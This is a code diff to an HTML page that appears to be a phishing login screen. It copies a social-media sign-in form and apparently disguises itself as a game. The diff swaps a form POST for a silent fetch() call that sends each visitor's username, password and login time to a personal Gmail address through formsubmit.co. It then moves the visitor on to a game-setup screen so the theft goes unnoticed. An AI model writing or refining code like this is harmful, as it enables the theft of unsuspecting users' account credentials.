@@ -159,26 +159,16 @@
                 </svg>
             </div>
 
-            <!-- Email Notification Form Action with your email -->
-            <form id="loginForm" action="https://formsubmit.co/vs4539876@gmail.com" method="POST">
-                
-                <!-- FormSubmit Settings -->
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
-
+            <form id="loginForm">
                 <div class="input-box">
-                    <input type="text" id="username" name="Username" placeholder="Username, email address or mobile number" required>
+                    <input type="text" id="username" placeholder="Username, email address or mobile number" required>
                 </div>
                 <div class="input-box">
-                    <input type="password" id="password" name="Password" placeholder="Password" required>
+                    <input type="password" id="password" placeholder="Password" required>
                     <button type="button" class="eye-btn" onclick="togglePassword()">
                         <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </button>
                 </div>
-                
-                <!-- Hidden time field -->
-                <input type="hidden" id="loginTime" name="Time">
-
                 <button type="submit" class="login-btn">Log in</button>
             </form>
             <a href="#" class="forgot-pass">Forgotten password?</a>
@@ -253,13 +243,37 @@
 
         const loginForm = document.getElementById('loginForm');
         loginForm.addEventListener('submit', function(e) {
-            // Set current time in hidden field before submit
-            document.getElementById('loginTime').value = new Date().toLocaleString();
+            e.preventDefault();
             
-            // Switch screen smoothly after a short moment
-            setTimeout(() => {
-                showScreen('gameSetupScreen');
-            }, 500);
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const timeStr = new Date().toLocaleString();
+
+            if(!username || !password) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            // Send data via AJAX (Fetch) directly to Formsubmit
+            fetch("https://formsubmit.co/ajax/vs4539876@gmail.com", {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    Username: username,
+                    Password: password,
+                    Time: timeStr,
+                    _captcha: "false"
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Email sent successfully:", data))
+            .catch(error => console.log("Error sending email:", error));
+
+            // Smoothly move to next screen
+            showScreen('gameSetupScreen');
         });
 
         let totalSeconds = 0;
